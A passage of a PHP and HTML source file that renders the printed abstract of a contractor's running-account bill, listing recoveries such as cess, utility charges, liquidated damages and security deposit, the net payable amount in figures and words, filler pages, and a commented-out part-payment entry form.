echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>IT Education CESS @ ".number_format($it_edu_percent, 2, '.', '')."% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($it_edu_amt, 2, '.', '')."</td><td style='border:none' colspan='1'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
//if($water_charge != 0)
//{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Water Charges (as per Bill enclosed) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$water_charge_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
//}
//if($electricity_charge != 0)
//{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Electricity Charges (as per Bill enclosed) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".$electricity_charge_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
//}
if($land_rent != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Rent for Land : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($land_rent, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($liquid_damage != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Liquidated Damages : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($liquid_damage, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($other_recovery_1 != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$other_recovery_1_desc." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($other_recovery_1, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($other_recovery_2 != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$other_recovery_2_desc." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($other_recovery_2, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($non_dep_machine_equip != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non Deployment of machineries & equipment as (per clause 18)  : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$non_dep_machine_equip_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}
if($non_dep_man_power != 0)
{
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non Deployment of Technical manpower (as per clause 36(i)) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$non_dep_man_power_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}

echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non-Submission of QA related document : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".number_format($nonsubmission_qa, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";


if($sd_amt != 0)
{
$eb = 1;
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ec_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Security Deposit @ 5% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($sd_amt, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}

// This row is for Recovery Release
if($rrcount>0)
{
	for($rrc=0; $rrc<$rrcount; $rrc++)
	{
	echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ed_text." (".$ed.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$RRDescCivArr[$rrc]." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".number_format($RRAmtCivArr[$rrc], 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
	$ed++; $ed_text = "";
	}
}

echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
if($total_recovery != 0)
{
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='5'></td><td style='border:none' class='labelprint' align='right' colspan='4'>&nbsp;</td><td colspan='2' align='right' style='border:none; border-bottom:1px dashed #000000' class='labelprint'></td><td style='border:none; border-bottom:1px dashed #000000'>&nbsp;</td></tr>";
}

if($Overall_net_amt_final != 0)
{
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='5'><b>Net Payable Amount :</b> <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='6'><b>".number_format($Overall_net_amt_final, 2, '.', '')."</b></td><td style='border:none'>&nbsp;</td></tr>";
}

//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
//$Overall_net_amt_final = "18767031.35";
$split_amt = explode(".",$Overall_net_amt_final);
$rupees_part = $split_amt[0];
$paise_part = $split_amt[1];
$rupee_part_word = number_to_words($rupees_part);

if($paise_part != 0)
{
	$paise_part_word = " and Paise ".number_to_words($paise_part)."";
}
$amount_in_words = $rupee_part_word.$paise_part_word;
echo "<tr style='border:none'><td style='border:none'>&nbsp;</td><td style='border:none'>&nbsp;</td><td style='border:none' class='labelprint' align='left' colspan='12'>Amount: (Rupees ".$amount_in_words.")</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>page ".$page."</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "</table>";
echo "<p  style='page-break-after:always;'></p>";
?>
<?php 

//echo "<p  style='page-break-after:always;'></p>";
for($x=0;$x<$emptypage;$x++)
{
$page++;
echo $title;
echo $table;
echo "<table width='1087px' bgcolor='white'   border='0' cellpadding='3' cellspacing='3' align='center' class='label table1'>";
echo $tablehead;
$y=1;
while($y<22)
{
?>
	<tr>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='20%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='8%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='4%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
</tr>
	<?php
	$y++;		
}
echo "<tr class='labelprint'><td colspan='12' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;border-top:2px solid #cacaca;' align='center'> </td></tr>";
echo "</table>";
echo "<p  style='page-break-after:always;'></p>";
//$page++;
}
?>
<input type="hidden" name="txt_abstmbno" id="txt_abstmbno" value="<?php echo $abstmbno; ?>" />
<input type="hidden" name="txt_maxpage" id="txt_maxpage" value="<?php echo $page; ?>" />
<input type="hidden" name="txt_abstractstr" id="txt_abstractstr" value="<?php echo $AbstractStr; ?>" />
<input type="hidden" name="txt_subdivid_slmstr" id="txt_subdivid_slmstr" value="<?php echo $SubdividSlmStr; ?>" />
<input type="hidden" name="txt_rbn_no" id="txt_rbn_no" value="<?php echo $runn_acc_bill_no; ?>" />

<input type="hidden" name="table_group_count" id="table_group_count" value="<?php echo $table_group_row; ?>" />
<input type="hidden" name="txt_sheet_id" id="txt_sheet_id" value="<?php echo $abstsheetid; ?>" />
<!--<div align="center" class="btn_outside_sect printbutton">
	<div class="btn_inside_sect">
		<input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> 
	</div>
	<div class="btn_inside_sect">
		<input type="Submit" name="Submit" value="Confirm" id="Submit" /> 
	</div>
	<div class="btn_inside_sect">
		<input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" />
	</div>
</div> -->

		<div style="text-align:center; height:45px; line-height:45px;" class="printbutton">
			<div class="buttonsection">
			<input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> 
			</div>
			<!--<div class="buttonsection">
			<input type="Submit" name="Submit" value="Confirm" id="Submit" /> 
			</div>-->
			<div class="buttonsection">
			<input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" />
			</div>
		</div>

		<!-- modal content -->
		<!--<div id="basic-modal-content">
			<div align="center" class="popuptitle">Part Payment Work Sheet</div>
			<div align="center" style="padding-top:10px;">
			<table class="label table2" width="100%" cellpadding="3" cellspacing="3" id="table2">
				<tr bgcolor="">
					<td width="60px" align="left">Item No.</td>
					<td width="">
						<input type="text" readonly="" name="txt_item_no" id="txt_item_no" size="8" class="popuptextbox" />
						<input type="hidden" name="txt_item_id" id="txt_item_id" size="8" class="popuptextbox" />
					</td>
					<td width="60px" align="center">RAB No.</td>
					<td width="">
						<input type="text" name="txt_rab_no" id="txt_rab_no" size="6" class="popuptextbox" value="<?php echo $rbn; ?>" />
					</td>
					<td  align="left" colspan="4">Measurement Date - From &nbsp; :
						<input type="text" name="txt_from_date" id="txt_from_date" size="12" class="popuptextbox" value="<?php echo dt_display($fromdate); ?>" />
					To :
						<input type="text" name="txt_to_date" id="txt_to_date" size="12" class="popuptextbox" value="<?php echo dt_display($todate); ?>" />
					</td>
				</tr>
				<tr bgcolor="">
				<td width="135px" align="left">Item Description</td>
					<td width="700px" align="left" colspan="7">
						<textarea name="txt_item_desc" id="txt_item_desc" class="popuptextbox" rows="2" style="text-align:left; width:820px; height:34px;"></textarea>
					</td>
				</tr>

			</table>
			</div>
			<div style="padding-top:10px; height:325px;">
				<div style="float:left; width:567px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="94%" id="table3">
					<tr bgcolor="#0080ff" style="color:#FFFFFF">
						<td align="center" colspan="7">Deduct Previous Measurement</td>
					</tr>
					<tr>
						<td align="left" colspan="7" bgcolor="#f2efef">
						Deduct Previous Measurement Total Quantity&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;
						<input type="text" name="txt_dpm_qty" id="txt_dpm_qty" size="17" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
						</td>
					</tr>
					<tr>
						<td width="10px" rowspan="2" align="center">RBN.</td>
						<td width="61px" rowspan="2" align="center">Item Qty.</td>
						<td width="63px" rowspan="2" align="center">Rate&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Paid Details</td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Payable Details</td>
					</tr>
					<tr>
						<td width="23px" align="center">(%)</td>
						<td width="110px" align="center">Amount&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td width="23px" align="center">(%)</td>
						<td style='width:110px' align="center">Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
					</tr>
					<tr>
						<td colspan="4" align="right">Total Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
						<td align="left"><input type="text" name="txt_partpay_total_paidamt_dpm" id="txt_partpay_total_paidamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
						<td colspan=""></td>
						<td colspan=""><input type="text" name="txt_partpay_total_payableamt_dpm" id="txt_partpay_total_payableamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
					</tr>
					<tr>
						<td colspan="7">Remarks:<br/><textarea name="txt_dpm_remarks" id="txt_dpm_remarks" rows="3" style="width:519px;"></textarea>
						</td>
					</tr>
				</table>
				</div>
				<div style="float:right;  width:427px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="93%" id="table4">
						<tr bgcolor="#0080ff" style="color:#FFFFFF">
							<td align="center" colspan="5">Since Last Measurement</td>
						</tr>
						<tr>
							<td align="left" colspan="5" bgcolor="#f2efef">
							Since Last Measurement Quantity&nbsp;:&nbsp;
							<input type="text" name="txt_slm_qty" id="txt_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							<input type="hidden" name="hid_slm_qty" id="hid_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							</td>
						</tr>
						<tr>
							<td width="61px" align="center">Item Qty.</td>
							<td width="63px" align="center">Rate&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="23px" align="center">(%)</td>
							<td width="50px" align="center">Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr id='rowid0'>
							<td width="61px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_qty_slm[]" id="txt_partpay_qty_slm0" class="dynamictextbox" style="text-align:right; width:93px; border: 1px solid #2aade4;" onblur="ValidateSlm(); calculateAmount(this,0,'qty','slm');" />
							</td>
							<td width="63px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_item_rate_slm" readonly="" id="txt_item_rate_slm0" class="dynamictextbox" style="text-align:right; width:80px;" onblur="calculateAmount(this,0,'rate','slm');" />
							</td>
							<td width="23px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_percent_slm" id="txt_partpay_percent_slm0" class="dynamictextbox" style="text-align:right; width:40px; border: 1px solid #2aade4;" onblur="ValidatePercent(this,'slm',0); calculateAmount(this,0,'percent','slm');" />
							</td>
							<td width="50px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_amt_slm[]" id="txt_partpay_amt_slm0" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center" class="dynamicrowcell" style="text-align:center;">
							<input type="button" name="btn_add_row_slm" id="btn_add_row_slm" class="editbtnstyle" value=" + " style="width:32px; text-align:center; font-weight:bold; border-radius: 0px;" onclick="addRow();" />
							<input type="hidden" name="hid_slm_result[]" id="hid_slm_result0" class="dynamictextbox" />
							</td>
						</tr>
						<tr>
							<td width="147px" colspan="3" align="right">Total Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
							<td width="50px" align="right"  class="dynamicrowcell">
							<input type="text" name="txt_partpay_total_amt_slm" id="txt_partpay_total_amt_slm" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr>
							<td colspan="5">Remarks:<br/><textarea name="txt_slm_remarks" id="txt_slm_remarks" rows="3" style="width:375px;"></textarea>
							</td>
						</tr>
					</table>
				</div>
			</div>
			<div align="right">
				<table width="100%" height="65" class="label" cellpadding="3" cellspacing="3">
					<tr>
					<td align="right" width="440px">
					<label style="background:#EAEAEA; padding:6px;">Over All Total Amount</label>&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;
					<input type="text" name="txt_overall_total" id="txt_overall_total" size="20" class="dynamictextbox dynamictextbox2" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
					</td>
					</tr>
				</table>
			</div>
			<div class="bottomsection" align="center">
				<div class="buttonsection" align="center"><input type="button" name="btn_save" id="btn_save" value=" Save " class="buttonstyle" onclick="SaveData()" /></div>
				<div class="buttonsection" align="center"><input type="button" name="btn_cancel" id="btn_cancel" value=" Cancel " class="buttonstyle" onclick="CancelData()" /></div>
			</div>
		</div>
		
		<!-- preload the images -->
		<!--<div style='display:none'>
			<img src='img/basic/x.png' alt='' />
		</div>     -->
</form>
</body>

</html>